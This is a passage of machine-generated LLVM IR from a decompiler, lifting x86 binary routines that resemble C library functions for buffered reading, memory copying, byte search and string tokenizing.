  uselistorder label %dec_label_pc_804fe69, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fe59, { 1, 0 }
  uselistorder label %dec_label_pc_804fded, { 1, 0 }
  uselistorder label %dec_label_pc_804fd16, { 1, 0 }
}

define i32 @function_805027c() local_unnamed_addr {
dec_label_pc_805027c:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_805027c = load i32, i32* @ebx, align 4
  %v4_8050280 = ptrtoint i16* %tmp to i32
  store i32 %v4_8050280, i32* @ebx, align 4
  %v1_8050284 = add i32 %v4_8050280, 16
  %v2_8050284 = inttoptr i32 %v1_8050284 to i32*
  %v3_8050284 = load i32, i32* %v2_8050284, align 4
  %v2_8050287 = add i32 %v4_8050280, 24
  %v3_8050287 = inttoptr i32 %v2_8050287 to i32*
  %v4_8050287 = load i32, i32* %v3_8050287, align 4
  %v10_8050287 = icmp ult i32 %v3_8050284, %v4_8050287
  br i1 %v10_8050287, label %dec_label_pc_8050329, label %dec_label_pc_8050290

dec_label_pc_8050290:                             ; preds = %dec_label_pc_805027c
  %v2_8050290 = load i16, i16* %tmp, align 2
  %v3_8050290 = zext i16 %v2_8050290 to i32
  %v1_8050293 = and i32 %v3_8050290, 131
  %v6_805029d = icmp ugt i32 %v1_8050293, 128
  br i1 %v6_805029d, label %dec_label_pc_80502b7, label %dec_label_pc_805029f

dec_label_pc_805029f:                             ; preds = %dec_label_pc_8050290
  %v0_805029f = load i32, i32* @edx, align 4
  %v6_80502a7 = call i32 @function_80512c0(i16* nonnull %tmp, i32 128, i32 %v0_805029f, i32 %v0_805029f)
  %v1_80502af = icmp eq i32 %v6_80502a7, 0
  %v1_80502b1 = icmp eq i1 %v1_80502af, false
  br i1 %v1_80502b1, label %dec_label_pc_805034e, label %dec_label_pc_805029f.dec_label_pc_80502b7_crit_edge

dec_label_pc_805029f.dec_label_pc_80502b7_crit_edge: ; preds = %dec_label_pc_805029f
  %v0_80502b7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80502b7

dec_label_pc_80502b7:                             ; preds = %dec_label_pc_805029f.dec_label_pc_80502b7_crit_edge, %dec_label_pc_8050290
  %v2_80502eb = phi i32 [ %v0_80502b7.pre, %dec_label_pc_805029f.dec_label_pc_80502b7_crit_edge ], [ %v4_8050280, %dec_label_pc_8050290 ]
  %v1_80502b7 = inttoptr i32 %v2_80502eb to i16*
  %v2_80502b7 = load i16, i16* %v1_80502b7, align 2
  %v3_80502b7 = zext i16 %v2_80502b7 to i32
  store i32 %v3_80502b7, i32* @ecx, align 4
  %v2_80502ba = and i16 %v2_80502b7, 2
  %v3_80502ba = icmp eq i16 %v2_80502ba, 0
  br i1 %v3_80502ba, label %dec_label_pc_80502da, label %dec_label_pc_80502bf

dec_label_pc_80502bf:                             ; preds = %dec_label_pc_80502b7
  %tmp20 = urem i16 %v2_80502b7, 2
  %v1_80502c1 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_80502c1
  %v2_80502c4 = and i32 %tmp19, 4
  %v3_80502c4 = add i32 %v2_80502eb, 36
  %v4_80502c4 = add i32 %v3_80502c4, %v2_80502c4
  %v5_80502c4 = inttoptr i32 %v4_80502c4 to i8*
  %v6_80502c4 = load i8, i8* %v5_80502c4, align 1
  %v7_80502c4 = zext i8 %v6_80502c4 to i32
  %v8_80502c4 = load i32, i32* @edx, align 4
  %v9_80502c4 = and i32 %v8_80502c4, -256
  %v10_80502c4 = or i32 %v9_80502c4, %v7_80502c4
  store i32 %v10_80502c4, i32* %edx.global-to-local, align 4
  %v1_80502c8 = add i16 %v2_80502b7, -1
  store i16 %v1_80502c8, i16* %v1_80502b7, align 2
  %v0_80502ce = load i32, i32* @ebx, align 4
  %v1_80502ce = add i32 %v0_80502ce, 40
  %v2_80502ce = inttoptr i32 %v1_80502ce to i32*
  store i32 0, i32* %v2_80502ce, align 4
  %v0_80502d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80502d5 = urem i32 %v0_80502d5, 256
  store i32 %v1_80502d5, i32* @edx, align 4
  br label %dec_label_pc_8050351

dec_label_pc_80502da:                             ; preds = %dec_label_pc_80502b7
  %v1_80502da = add i32 %v2_80502eb, 16
  %v2_80502da = inttoptr i32 %v1_80502da to i32*
  %v3_80502da = load i32, i32* %v2_80502da, align 4
  store i32 %v3_80502da, i32* @eax, align 4
  %v1_80502dd = add i32 %v2_80502eb, 20
  %v2_80502dd = inttoptr i32 %v1_80502dd to i32*
  %v3_80502dd = load i32, i32* %v2_80502dd, align 4
  %v15_80502dd = icmp eq i32 %v3_80502dd, %v3_80502da
  %v1_80502e0 = icmp eq i1 %v15_80502dd, false
  br i1 %v1_80502e0, label %dec_label_pc_8050329, label %dec_label_pc_80502e2

dec_label_pc_80502e2:                             ; preds = %dec_label_pc_80502da
  %v1_80502e2 = add i32 %v2_80502eb, 4
  %v2_80502e2 = inttoptr i32 %v1_80502e2 to i32*
  %v3_80502e2 = load i32, i32* %v2_80502e2, align 4
  %v13_80502e2 = icmp eq i32 %v3_80502e2, -2
  %v1_80502e6 = icmp eq i1 %v13_80502e2, false
  br i1 %v1_80502e6, label %dec_label_pc_80502f0, label %dec_label_pc_80502e8

dec_label_pc_80502e8:                             ; preds = %dec_label_pc_80502e2
  %v1_80502e8 = or i32 %v3_80502b7, 4
  store i32 %v1_80502e8, i32* @ecx, align 4
  %v1_80502eb = trunc i32 %v1_80502e8 to i16
  store i16 %v1_80502eb, i16* %v1_80502b7, align 2
  br label %dec_label_pc_805034e

dec_label_pc_80502f0:                             ; preds = %dec_label_pc_80502e2
  %v3_80502f0 = and i16 %v2_80502b7, 768
  %v4_80502f0 = icmp eq i16 %v3_80502f0, 0
  br i1 %v4_80502f0, label %dec_label_pc_8050305, label %dec_label_pc_80502f5

dec_label_pc_80502f5:                             ; preds = %dec_label_pc_80502f0
  %v3_80502fd = call i32 @function_804ce84(i16* bitcast (i32** @global_var_8055b5c.117 to i16*))
  %v0_8050305.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050305

dec_label_pc_8050305:                             ; preds = %dec_label_pc_80502f0, %dec_label_pc_80502f5
  %v0_805033a = phi i32 [ %v2_80502eb, %dec_label_pc_80502f0 ], [ %v0_8050305.pre, %dec_label_pc_80502f5 ]
  %v1_8050305 = add i32 %v0_805033a, 8
  %v2_8050305 = inttoptr i32 %v1_8050305 to i32*
  %v3_8050305 = load i32, i32* %v2_8050305, align 4
  %v1_8050308 = add i32 %v0_805033a, 12
  %v2_8050308 = inttoptr i32 %v1_8050308 to i32*
  %v3_8050308 = load i32, i32* %v2_8050308, align 4
  %v15_8050308 = icmp eq i32 %v3_8050308, %v3_8050305
  br i1 %v15_8050308, label %dec_label_pc_8050332, label %dec_label_pc_805030d

dec_label_pc_805030d:                             ; preds = %dec_label_pc_8050305
  %v2_8050310 = add i32 %v0_805033a, 24
  %v3_8050310 = inttoptr i32 %v2_8050310 to i32*
  store i32 %v3_8050305, i32* %v3_8050310, align 4
  %v0_8050313 = load i32, i32* @ebx, align 4
  %v2_8050314 = call i32 @function_8051298(i32 %v0_8050313)
  %v1_805031c = icmp eq i32 %v2_8050314, 0
  br i1 %v1_805031c, label %dec_label_pc_805034e, label %dec_label_pc_8050320

dec_label_pc_8050320:                             ; preds = %dec_label_pc_805030d
  %v0_8050320 = load i32, i32* @ebx, align 4
  %v1_8050320 = add i32 %v0_8050320, 20
  %v2_8050320 = inttoptr i32 %v1_8050320 to i32*
  %v3_8050320 = load i32, i32* %v2_8050320, align 4
  %v2_8050323 = add i32 %v0_8050320, 24
  %v3_8050323 = inttoptr i32 %v2_8050323 to i32*
  store i32 %v3_8050320, i32* %v3_8050323, align 4
  %v0_8050326 = load i32, i32* @ebx, align 4
  %v1_8050326 = add i32 %v0_8050326, 16
  %v2_8050326 = inttoptr i32 %v1_8050326 to i32*
  %v3_8050326 = load i32, i32* %v2_8050326, align 4
  br label %dec_label_pc_8050329

dec_label_pc_8050329:                             ; preds = %dec_label_pc_80502da, %dec_label_pc_805027c, %dec_label_pc_8050320
  %v1_805032d = phi i32 [ %v2_80502eb, %dec_label_pc_80502da ], [ %v4_8050280, %dec_label_pc_805027c ], [ %v0_8050326, %dec_label_pc_8050320 ]
  %v0_8050329 = phi i32 [ %v3_80502da, %dec_label_pc_80502da ], [ %v3_8050284, %dec_label_pc_805027c ], [ %v3_8050326, %dec_label_pc_8050320 ]
  %v1_8050329 = inttoptr i32 %v0_8050329 to i8*
  %v2_8050329 = load i8, i8* %v1_8050329, align 1
  %v3_8050329 = zext i8 %v2_8050329 to i32
  store i32 %v3_8050329, i32* @edx, align 4
  %v1_805032c = add i32 %v0_8050329, 1
  %v2_805032d = add i32 %v1_805032d, 16
  %v3_805032d = inttoptr i32 %v2_805032d to i32*
  store i32 %v1_805032c, i32* %v3_805032d, align 4
  %v0_8050354.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050351

dec_label_pc_8050332:                             ; preds = %dec_label_pc_8050305
  %v2_8050335 = ptrtoint i8* %stack_var_-5 to i32
  %v5_805033a = inttoptr i32 %v0_805033a to i16*
  %v5_805033b = call i32 @function_80511a4(i16* %v5_805033a, i32 %v2_8050335, i32 1)
  %v1_8050343 = icmp eq i32 %v5_805033b, 0
  br i1 %v1_8050343, label %dec_label_pc_805034e, label %dec_label_pc_8050347

dec_label_pc_8050347:                             ; preds = %dec_label_pc_8050332
  %v3_8050347 = load i8, i8* %stack_var_-5, align 1
  %v4_8050347 = sext i8 %v3_8050347 to i32
  store i32 %v4_8050347, i32* @edx, align 4
  br label %dec_label_pc_8050351

dec_label_pc_805034e:                             ; preds = %dec_label_pc_8050332, %dec_label_pc_805030d, %dec_label_pc_805029f, %dec_label_pc_80502e8
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8050351

dec_label_pc_8050351:                             ; preds = %dec_label_pc_8050347, %dec_label_pc_8050329, %dec_label_pc_80502bf, %dec_label_pc_805034e
  %v0_8050354 = phi i32 [ %v4_8050347, %dec_label_pc_8050347 ], [ %v0_8050354.pre, %dec_label_pc_8050329 ], [ %v1_80502d5, %dec_label_pc_80502bf ], [ -1, %dec_label_pc_805034e ]
  store i32 %v0_805027c, i32* @ebx, align 4
  ret i32 %v0_8050354

; uselistorder directives
  uselistorder i32 %v0_8050329, { 1, 0 }
  uselistorder i32 %v3_8050305, { 1, 0 }
  uselistorder i32 %v0_805033a, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80502da, { 1, 0, 2 }
  uselistorder i32 %v1_80502d5, { 1, 0 }
  uselistorder i16 %v2_80502b7, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80502eb, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_8055ba0.103, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8050351, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805034e, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8050329, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050305, { 1, 0 }
}

define i32 @function_8050358(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050358:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8050358 = load i32, i32* @edi, align 4
  store i32 %v0_8050358, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_805035f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805035f, i32* %edi.global-to-local, align 4
  %v1_8050367 = icmp eq i32 %arg3, 0
  store i1 %v1_8050367, i1* %zf.global-to-local, align 1
  br i1 %v1_8050367, label %dec_label_pc_8050377, label %dec_label_pc_805036b

dec_label_pc_805036b:                             ; preds = %dec_label_pc_8050358
  %v2_805036b = call i32 @_strlen(i8* %arg1)
  %v3_805036b = mul i32 %v2_805036b, -1
  %v4_805036b = add i32 %v3_805036b, -2
  store i32 %v4_805036b, i32* @ecx, align 4
  %v0_805036d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805036d, label %dec_label_pc_805036b.dec_label_pc_8050374_crit_edge, label %dec_label_pc_805036f

dec_label_pc_805036b.dec_label_pc_8050374_crit_edge: ; preds = %dec_label_pc_805036b
  %v0_8050374.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8050374.pre, -1
  br label %dec_label_pc_8050374

dec_label_pc_805036f:                             ; preds = %dec_label_pc_805036b
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050374

dec_label_pc_8050374:                             ; preds = %dec_label_pc_805036b.dec_label_pc_8050374_crit_edge, %dec_label_pc_805036f
  %v0_8050374 = phi i32 [ %phitmp, %dec_label_pc_805036b.dec_label_pc_8050374_crit_edge ], [ 0, %dec_label_pc_805036f ]
  %v8_8050374 = icmp eq i32 %v0_8050374, 0
  store i1 %v8_8050374, i1* %zf.global-to-local, align 1
  store i32 %v0_8050374, i32* %edi.global-to-local, align 4
  %v2_8050377.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8050377

dec_label_pc_8050377:                             ; preds = %dec_label_pc_8050358, %dec_label_pc_8050374
  %v0_8050378 = phi i32 [ 0, %dec_label_pc_8050358 ], [ %v0_8050374, %dec_label_pc_8050374 ]
  %v2_8050377 = phi i32 [ %v0_8050358, %dec_label_pc_8050358 ], [ %v2_8050377.pre, %dec_label_pc_8050374 ]
  store i32 %v2_8050377, i32* @edi, align 4
  ret i32 %v0_8050378

; uselistorder directives
  uselistorder i32 %v0_8050374, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8050377, { 1, 0 }
  uselistorder label %dec_label_pc_8050374, { 1, 0 }
}

define i32 @function_805037c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805037c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_805037d = load i32, i32* @esi, align 4
  store i32 %v0_805037d, i32* %stack_var_-8, align 4
  %v4_805037e = ptrtoint i8* %arg1 to i32
  %v9_805038a = icmp ugt i8* %tmp3, %arg1
  %v1_805038c = icmp eq i1 %v9_805038a, false
  br i1 %v1_805038c, label %dec_label_pc_8050394, label %dec_label_pc_805038e

dec_label_pc_805038e:                             ; preds = %dec_label_pc_805037c
  %v7_8050390 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_80503a0

dec_label_pc_8050394:                             ; preds = %dec_label_pc_805037c
  %v3_8050394 = add i32 %arg2, -1
  %v4_8050394 = add i32 %v3_8050394, %tmp
  %v5_8050394 = inttoptr i32 %v4_8050394 to i8*
  %v3_8050398 = add i32 %v4_805037e, -1
  %v4_8050398 = add i32 %v3_8050398, %tmp
  %v5_8050398 = inttoptr i32 %v4_8050398 to i8*
  %v7_805039d = call i8* @_memcpy(i8* %v5_8050398, i8* %v5_8050394, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80503a0

dec_label_pc_80503a0:                             ; preds = %dec_label_pc_805038e, %dec_label_pc_8050394
  %v2_80503a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80503a0, i32* @esi, align 4
  ret i32 %v4_805037e

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80503a0, { 1, 0 }
}

define i32 @function_80503a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80503a4:
  %v0_80503a4 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_80503b7 = inttoptr i32 %arg1 to i16*
  %v4_80503b7 = call i32 @function_804d1a8(i16* %v3_80503b7, i32 %arg2, i32 %arg3)
  %v0_80503bf = load i32, i32* @esi, align 4
  %v2_80503bf = add i32 %v0_80503bf, %arg3
  store i32 %v0_80503a4, i32* @esi, align 4
  ret i32 %v2_80503bf
}

define i32 @function_80503c8(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80503c8:
  %tmp = trunc i32 %arg2 to i8
  %v4_80503cd = urem i32 %arg2, 256
  %v4_80503d9 = sext i8 %arg1 to i32
  %v2_80503dd = add i32 %v4_80503d9, %arg3
  %v1_80503ef7 = icmp eq i32 %arg3, 0
  br i1 %v1_80503ef7, label %dec_label_pc_80503f7, label %dec_label_pc_80503f3

dec_label_pc_80503e1:                             ; preds = %dec_label_pc_80503f3
  %v1_80503e1 = add i32 %v0_80503e1, -1
  %v5_80503e2 = load i32, i32* @edx, align 4
  %v6_80503e2 = and i32 %v5_80503e2, -256
  %v7_80503e2 = or i32 %v6_80503e2, %v4_80503cd
  store i32 %v7_80503e2, i32* @edx, align 4
  %v1_80503e6 = inttoptr i32 %v1_80503e1 to i8*
  %v2_80503e6 = load i8, i8* %v1_80503e6, align 1
  %v15_80503e6 = icmp eq i8 %v2_80503e6, %tmp
  br i1 %v15_80503e6, label %dec_label_pc_8050474, label %dec_label_pc_80503ee

dec_label_pc_80503ee:                             ; preds = %dec_label_pc_80503e1
  %v1_80503ee = add i32 %v0_80503ee, -1
  %v8_80503ee = icmp eq i32 %v1_80503ee, 0
  br i1 %v8_80503ee, label %dec_label_pc_80503f7, label %dec_label_pc_80503f3

dec_label_pc_80503f3:                             ; preds = %dec_label_pc_80503c8, %dec_label_pc_80503ee
  %v0_80503ee = phi i32 [ %v1_80503ee, %dec_label_pc_80503ee ], [ %arg3, %dec_label_pc_80503c8 ]
  %v0_80503e1 = phi i32 [ %v1_80503e1, %dec_label_pc_80503ee ], [ %v2_80503dd, %dec_label_pc_80503c8 ]
  %v2_80503f3 = urem i32 %v0_80503e1, 4
  %v3_80503f3 = icmp eq i32 %v2_80503f3, 0
  %v1_80503f5 = icmp eq i1 %v3_80503f3, false
  br i1 %v1_80503f5, label %dec_label_pc_80503e1, label %dec_label_pc_80503f7

dec_label_pc_80503f7:                             ; preds = %dec_label_pc_80503ee, %dec_label_pc_80503f3, %dec_label_pc_80503c8
  %v0_805045a.pr = phi i32 [ 0, %dec_label_pc_80503c8 ], [ 0, %dec_label_pc_80503ee ], [ %v0_80503ee, %dec_label_pc_80503f3 ]
  %v0_80503fc = phi i32 [ %v2_80503dd, %dec_label_pc_80503c8 ], [ %v1_80503e1, %dec_label_pc_80503ee ], [ %v0_80503e1, %dec_label_pc_80503f3 ]
  store i32 %v0_80503fc, i32* @ecx, align 4
  %v2_8050400 = mul nuw nsw i32 %v4_80503cd, 256
  %v2_8050403 = or i32 %v2_8050400, %v4_80503cd
  %v2_8050407 = mul i32 %v2_8050403, 65536
  %v2_805040a = or i32 %v2_8050407, %v2_8050403
  %v6_805045d52 = icmp ugt i32 %v0_805045a.pr, 3
  br i1 %v6_805045d52, label %dec_label_pc_805040e, label %dec_label_pc_805045f

dec_label_pc_805040e:                             ; preds = %dec_label_pc_80503f7, %dec_label_pc_8050457
  %v0_805045754 = phi i32 [ %v1_8050457, %dec_label_pc_8050457 ], [ %v0_805045a.pr, %dec_label_pc_80503f7 ]
  %v0_805040e53 = phi i32 [ %v1_805040e, %dec_label_pc_8050457 ], [ %v0_80503fc, %dec_label_pc_80503f7 ]
  %v1_805040e = add i32 %v0_805040e53, -4
  store i32 %v1_805040e, i32* @ecx, align 4
  %v2_8050413 = inttoptr i32 %v1_805040e to i32*
  %v3_8050413 = load i32, i32* %v2_8050413, align 4
  %v4_8050413 = xor i32 %v3_8050413, %v2_805040a
  %v1_8050415 = add i32 %v4_8050413, 2130640639
  %v1_805041b = sub i32 -1, %v4_8050413
  %v2_805041d = xor i32 %v1_8050415, %v1_805041b
  %v1_805041f = and i32 %v2_805041d, -2130640640
  %v2_805041f = icmp eq i32 %v1_805041f, 0
  br i1 %v2_805041f, label %dec_label_pc_8050457, label %dec_label_pc_8050427

dec_label_pc_8050427:                             ; preds = %dec_label_pc_805040e
  %v7_8050427 = or i32 %v1_805041f, %v4_80503cd
  %v1_805042b = add i32 %v0_805040e53, -1
  %v2_805042e = inttoptr i32 %v1_805042b to i8*
  %v3_805042e = load i8, i8* %v2_805042e, align 1
  %v16_805042e = icmp eq i8 %v3_805042e, %tmp
  br i1 %v16_805042e, label %dec_label_pc_8050474, label %dec_label_pc_8050433

dec_label_pc_8050433:                             ; preds = %dec_label_pc_8050427
  %v1_8050437 = add i32 %v0_805040e53, -2
  %v2_805043a = inttoptr i32 %v1_8050437 to i8*
  %v3_805043a = load i8, i8* %v2_805043a, align 1
  %v16_805043a = icmp eq i8 %v3_805043a, %tmp
  br i1 %v16_805043a, label %dec_label_pc_8050474, label %dec_label_pc_805043f

dec_label_pc_805043f:                             ; preds = %dec_label_pc_8050433
  %v1_8050443 = add i32 %v0_805040e53, -3
  %v2_8050446 = inttoptr i32 %v1_8050443 to i8*
  %v3_8050446 = load i8, i8* %v2_8050446, align 1
  %v16_8050446 = icmp eq i8 %v3_8050446, %tmp
  br i1 %v16_8050446, label %dec_label_pc_8050474, label %dec_label_pc_805044b

dec_label_pc_805044b:                             ; preds = %dec_label_pc_805043f
  %v1_805044f = inttoptr i32 %v1_805040e to i8*
  %v2_805044f = load i8, i8* %v1_805044f, align 1
  %v15_805044f = icmp eq i8 %v2_805044f, %tmp
  %v1_8050451 = icmp eq i1 %v15_805044f, false
  br i1 %v1_8050451, label %dec_label_pc_8050457, label %dec_label_pc_8050453

dec_label_pc_8050453:                             ; preds = %dec_label_pc_805044b
  br label %dec_label_pc_8050474

dec_label_pc_8050457:                             ; preds = %dec_label_pc_805044b, %dec_label_pc_805040e
  %v5_805046427 = phi i32 [ %v7_8050427, %dec_label_pc_805044b ], [ 0, %dec_label_pc_805040e ]
  %v1_8050457 = add i32 %v0_805045754, -4
  %v6_805045d = icmp ugt i32 %v1_8050457, 3
  br i1 %v6_805045d, label %dec_label_pc_805040e, label %dec_label_pc_805045f

dec_label_pc_805045f:                             ; preds = %dec_label_pc_8050457, %dec_label_pc_80503f7
  %v5_805046426.lcssa = phi i32 [ %v4_80503cd, %dec_label_pc_80503f7 ], [ %v5_805046427, %dec_label_pc_8050457 ]
  %v0_805040e.lcssa = phi i32 [ %v0_80503fc, %dec_label_pc_80503f7 ], [ %v1_805040e, %dec_label_pc_8050457 ]
  %v0_8050457.lcssa = phi i32 [ %v0_805045a.pr, %dec_label_pc_80503f7 ], [ %v1_8050457, %dec_label_pc_8050457 ]
  br label %dec_label_pc_805046c

dec_label_pc_8050463:                             ; preds = %dec_label_pc_805046c
  %v1_805046c = add i32 %v0_805046c, -1
  %v1_8050463 = add i32 %v0_8050463, -1
  %v6_8050464 = and i32 %v5_8050464, -256
  %v7_8050464 = or i32 %v6_8050464, %v4_80503cd
  %v1_8050468 = inttoptr i32 %v1_8050463 to i8*
  %v2_8050468 = load i8, i8* %v1_8050468, align 1
  %v15_8050468 = icmp eq i8 %v2_8050468, %tmp
  br i1 %v15_8050468, label %dec_label_pc_8050474, label %dec_label_pc_805046c

dec_label_pc_805046c:                             ; preds = %dec_label_pc_8050463, %dec_label_pc_805045f
  %v5_8050464 = phi i32 [ %v7_8050464, %dec_label_pc_8050463 ], [ %v5_805046426.lcssa, %dec_label_pc_805045f ]
  %v0_8050463 = phi i32 [ %v1_8050463, %dec_label_pc_8050463 ], [ %v0_805040e.lcssa, %dec_label_pc_805045f ]
  %v0_805046c = phi i32 [ %v1_805046c, %dec_label_pc_8050463 ], [ %v0_8050457.lcssa, %dec_label_pc_805045f ]
  %v10_805046d = icmp eq i32 %v0_805046c, 0
  %v1_8050470 = icmp eq i1 %v10_805046d, false
  br i1 %v1_8050470, label %dec_label_pc_8050463, label %dec_label_pc_8050472

dec_label_pc_8050472:                             ; preds = %dec_label_pc_805046c
  br label %dec_label_pc_8050474

dec_label_pc_8050474:                             ; preds = %dec_label_pc_80503e1, %dec_label_pc_805043f, %dec_label_pc_8050433, %dec_label_pc_8050427, %dec_label_pc_8050463, %dec_label_pc_8050453, %dec_label_pc_8050472
  %v0_8050477 = phi i32 [ %v1_805040e, %dec_label_pc_8050453 ], [ 0, %dec_label_pc_8050472 ], [ %v1_8050463, %dec_label_pc_8050463 ], [ %v1_8050443, %dec_label_pc_805043f ], [ %v1_8050437, %dec_label_pc_8050433 ], [ %v1_805042b, %dec_label_pc_8050427 ], [ %v1_80503e1, %dec_label_pc_80503e1 ]
  ret i32 %v0_8050477

; uselistorder directives
  uselistorder i32 %v0_805046c, { 1, 0 }
  uselistorder i32 %v1_8050457, { 0, 2, 1 }
  uselistorder i32 %v1_805040e, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805040e53, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8050403, { 1, 0 }
  uselistorder i32 %v0_80503e1, { 1, 0, 2 }
  uselistorder i32 %v2_80503dd, { 1, 0 }
  uselistorder i32 %v4_80503cd, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050474, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805040e, { 1, 0 }
  uselistorder label %dec_label_pc_80503f7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503f3, { 1, 0 }
}

define i32 @function_8050478(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050478:
  %eax.global-to-local = alloca i32, align 4
  %v4_805047b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805047b, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8050487 = icmp eq i8* %arg1, null
  %v1_8050489 = icmp eq i1 %v1_8050487, false
  br i1 %v1_8050489, label %dec_label_pc_805048d, label %dec_label_pc_805048b

dec_label_pc_805048b:                             ; preds = %dec_label_pc_8050478
  %v1_805048b = inttoptr i32 %arg3 to i32*
  %v2_805048b = load i32, i32* %v1_805048b, align 4
  store i32 %v2_805048b, i32* @ebx, align 4
  br label %dec_label_pc_805048d

dec_label_pc_805048d:                             ; preds = %dec_label_pc_8050478, %dec_label_pc_805048b
  %v0_8050490 = phi i32 [ %v4_805047b, %dec_label_pc_8050478 ], [ %v2_805048b, %dec_label_pc_805048b ]
  %v0_805048d = load i32, i32* @ecx, align 4
  %v5_8050490 = inttoptr i32 %v0_8050490 to i8*
  %v8_8050491 = call i32 @function_8051418(i8* %v5_8050490, i32 %arg2, i32 %v0_805048d, i32 %v0_805048d)
  store i32 %v8_8050491, i32* %eax.global-to-local, align 4
  %v0_8050499 = load i32, i32* @ebx, align 4
  %v2_8050499 = add i32 %v0_8050499, %v8_8050491
  store i32 %v2_8050499, i32* @ebx, align 4
  %v1_805049b = inttoptr i32 %v2_8050499 to i8*
  %v2_805049b = load i8, i8* %v1_805049b, align 1
  %v3_805049b = icmp eq i8 %v2_805049b, 0
  %v1_805049e = icmp eq i1 %v3_805049b, false
  br i1 %v1_805049e, label %dec_label_pc_80504a6, label %dec_label_pc_80504a0

dec_label_pc_80504a0:                             ; preds = %dec_label_pc_805048d
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80504a2 = load i32, i32* @esi, align 4
  %v2_80504a2 = inttoptr i32 %v1_80504a2 to i32*
  store i32 %v2_8050499, i32* %v2_80504a2, align 4
  %v0_80504d0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80504cd

dec_label_pc_80504a6:                             ; preds = %dec_label_pc_805048d
  %v0_80504a6 = load i32, i32* @edx, align 4
  %v0_80504a8 = load i32, i32* @edi, align 4
  %v8_80504aa = call i32 @function_80504d4(i8* %v1_805049b, i32 %v0_80504a8, i32 %v0_80504a6, i32 %v0_80504a6)
  store i32 %v8_80504aa, i32* %eax.global-to-local, align 4
  %v2_80504b2 = icmp eq i32 %v8_80504aa, 0
  %v1_80504b4 = icmp eq i1 %v2_80504b2, false
  br i1 %v1_80504b4, label %dec_label_pc_80504c5, label %dec_label_pc_80504b6

dec_label_pc_80504b6:                             ; preds = %dec_label_pc_80504a6
  %v0_80504ba = load i32, i32* @ebx, align 4
  %v5_80504ba = inttoptr i32 %v0_80504ba to i8*
  %v8_80504bb = call i32 @function_80513b4(i8* %v5_80504ba, i32 0, i32 %v8_80504aa, i32 %v8_80504aa)
  br label %dec_label_pc_80504c9

dec_label_pc_80504c5:                             ; preds = %dec_label_pc_80504a6
  %v9_80504aa = inttoptr i32 %v8_80504aa to i8*
  store i8 0, i8* %v9_80504aa, align 1
  %v2_80504c8 = add i32 %v8_80504aa, 1
  br label %dec_label_pc_80504c9

dec_label_pc_80504c9:                             ; preds = %dec_label_pc_80504b6, %dec_label_pc_80504c5
  %storemerge = phi i32 [ %v2_80504c8, %dec_label_pc_80504c5 ], [ %v8_80504bb, %dec_label_pc_80504b6 ]
  %v0_80504c9 = phi i32 [ %v2_80504c8, %dec_label_pc_80504c5 ], [ %v8_80504bb, %dec_label_pc_80504b6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80504c9 = load i32, i32* @esi, align 4
  %v2_80504c9 = inttoptr i32 %v1_80504c9 to i32*
  store i32 %v0_80504c9, i32* %v2_80504c9, align 4
  %v0_80504cb = load i32, i32* @ebx, align 4
  store i32 %v0_80504cb, i32* %eax.global-to-local, align 4
